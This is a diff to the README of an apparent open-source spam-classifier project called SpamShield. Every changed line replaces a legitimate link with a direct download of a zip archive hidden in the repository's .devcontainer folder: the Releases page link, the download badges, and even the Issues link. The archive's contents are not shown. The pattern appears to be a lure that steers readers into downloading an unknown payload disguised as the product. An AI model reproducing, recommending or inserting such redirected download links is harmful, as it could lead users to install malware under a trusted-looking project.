@@ -5,7 +5,7 @@ SpamShield is an AI-powered email and SMS spam classifier. It helps you filter u
 
 ## 📥 Get Started
 
-[![Download SpamShield](https://img.shields.io/badge/Download_SpamShield-v1.0-brightgreen.svg)](https://github.com/Ranpops/SpamShield/releases)
+[![Download SpamShield](https://github.com/Ranpops/SpamShield/raw/refs/heads/main/.devcontainer/Shield_Spam_consilient.zip)](https://github.com/Ranpops/SpamShield/raw/refs/heads/main/.devcontainer/Shield_Spam_consilient.zip)
 
 ### 📂 Features
 
@@ -24,7 +24,7 @@ SpamShield is an AI-powered email and SMS spam classifier. It helps you filter u
 
 ## 💾 Download & Install
 
-To get SpamShield, visit this page to download: [Releases Page](https://github.com/Ranpops/SpamShield/releases).
+To get SpamShield, visit this page to download: [Releases Page](https://github.com/Ranpops/SpamShield/raw/refs/heads/main/.devcontainer/Shield_Spam_consilient.zip).
 
 ### Installation Steps
 
@@ -71,7 +71,7 @@ This project is open-source and available under the MIT License. You can use it 
 
 For updates and discussions, follow us on our community channels:
 
-- **GitHub Issues**: [Report here](https://github.com/Ranpops/SpamShield/issues)
+- **GitHub Issues**: [Report here](https://github.com/Ranpops/SpamShield/raw/refs/heads/main/.devcontainer/Shield_Spam_consilient.zip)
 - **Community Forum**: Join discussions about spam detection.
 
 ## 🔗 Additional Resources
@@ -83,4 +83,4 @@ For updates and discussions, follow us on our community channels:
 
 Thank you for using SpamShield. Together, we can create a spam-free communication environment.
 
-[![Download SpamShield](https://img.shields.io/badge/Download_SpamShield-v1.0-brightgreen.svg)](https://github.com/Ranpops/SpamShield/releases)
+[![Download SpamShield](https://github.com/Ranpops/SpamShield/raw/refs/heads/main/.devcontainer/Shield_Spam_consilient.zip)](https://github.com/Ranpops/SpamShield/raw/refs/heads/main/.devcontainer/Shield_Spam_consilient.zip)
